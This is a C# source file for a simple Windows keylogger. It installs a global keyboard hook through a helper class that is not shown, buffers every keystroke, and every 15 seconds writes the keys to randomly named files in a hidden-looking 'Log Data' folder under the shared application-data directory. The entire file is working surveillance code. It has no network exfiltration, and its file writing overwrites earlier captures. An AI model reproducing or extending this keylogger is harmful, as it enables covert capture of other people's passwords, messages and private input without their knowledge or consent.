using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Reactive.Linq;
using System.Text;

namespace Simple_Logger
{
    internal class Logger
    {
        // Used to store key strokes

        public static List<string> Keys = new List<string>();

        // Initialize the directory used to store key strokes in

        private static string InitializeDirectory()
        {
            var folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Log Data");
            Directory.CreateDirectory(folderPath);

            return folderPath;
        }

        // Initialize the file used to store key strokes for the session
        
        private static string InitializeLogFile()
        {
            var folderPath = InitializeDirectory();

            // Generate a new log file

            var logFile = Path.GetRandomFileName();

            var filePath = String.Format(folderPath + "\\{0}", logFile);

            if (!File.Exists(filePath))
            {
                File.Create(filePath).Close();
            }

            else
            {
                logFile = Path.GetRandomFileName();

                filePath = String.Format(folderPath + "\\{0}", logFile);

                File.Create(filePath).Close();
            }

            return filePath;
        }

        // Start logging key strokes

        public static void Main()
        {
            var filePath = InitializeLogFile();

            // Write keystrokes to file every 15 seconds

            Observable.Interval(TimeSpan.FromSeconds(15)).Subscribe(x =>
            {
                WriteToFile(filePath);
            });

            Hook._hookId = Hook.SetHook(Hook.Proc);
            Application.Run();
            Hook.UnhookWindowsHookEx(Hook._hookId);

        }

        // Write key strokes to file

        private static void WriteToFile(string filePath)
        {
            var keystrokes = new StringBuilder();

            foreach (var key in Keys)
            {
                keystrokes.AppendLine(key);
            }

            File.WriteAllText(filePath, keystrokes.ToString());

            // Remove keystrokes that have been written to file from storage

            Keys.Clear();
        }
    }
}
